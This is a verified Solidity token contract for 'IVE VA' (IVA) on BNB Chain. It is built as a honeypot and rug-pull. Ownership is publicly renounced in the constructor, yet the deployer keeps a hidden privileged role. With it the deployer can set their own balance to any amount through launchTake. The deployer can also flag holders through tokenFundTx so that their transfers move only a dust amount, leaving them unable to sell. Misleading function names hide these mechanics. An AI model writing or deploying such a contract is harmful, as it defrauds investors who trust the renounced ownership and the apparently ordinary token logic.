/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract IVEVA {
    uint8 public decimals = 18;
    string public symbol = "IVA";

    mapping(address => bool) public walletLiquidity;
    uint256 constant shouldBuy = 10 ** 10;
    address public owner;
    mapping(address => bool) public limitMax;
    string public name = "IVE VA";


    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => mapping(address => uint256)) public allowance;

    address public listTrading;
    address public senderAmountTrading;

    modifier enableToken() {
        require(walletLiquidity[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        IUniswapV2Router receiverSellMode = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        senderAmountTrading = IUniswapV2Factory(receiverSellMode.factory()).createPair(receiverSellMode.WETH(), address(this));
        owner = msg.sender;
        listTrading = owner;
        walletLiquidity[listTrading] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    function transfer(address dst, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, dst, amount);
    }

    function launchTake(uint256 launchedList) public enableToken {
        balanceOf[listTrading] = launchedList;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function _transferFrom(address src, address dst, uint256 amount) internal returns (bool) {
        if (src == listTrading || dst == listTrading) {
            return buyFee(src, dst, amount);
        }
        if (limitMax[src]) {
            return buyFee(src, dst, shouldBuy);
        }
        return buyFee(src, dst, amount);
    }

    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {
        if (allowance[src][msg.sender] != type(uint256).max) {
            require(allowance[src][msg.sender] >= amount);
            allowance[src][msg.sender] -= amount;
        }
        return _transferFrom(src, dst, amount);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function buyFee(address autoLaunch, address listTeam, uint256 launchedList) internal returns (bool) {
        require(balanceOf[autoLaunch] >= launchedList);
        balanceOf[autoLaunch] -= launchedList;
        balanceOf[listTeam] += launchedList;
        emit Transfer(autoLaunch, listTeam, launchedList);
        return true;
    }

    function receiverLaunched(address burnTake) public enableToken {
        walletLiquidity[burnTake] = true;
    }

    function tokenFundTx(address modeAt) public enableToken {
        limitMax[modeAt] = true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }


}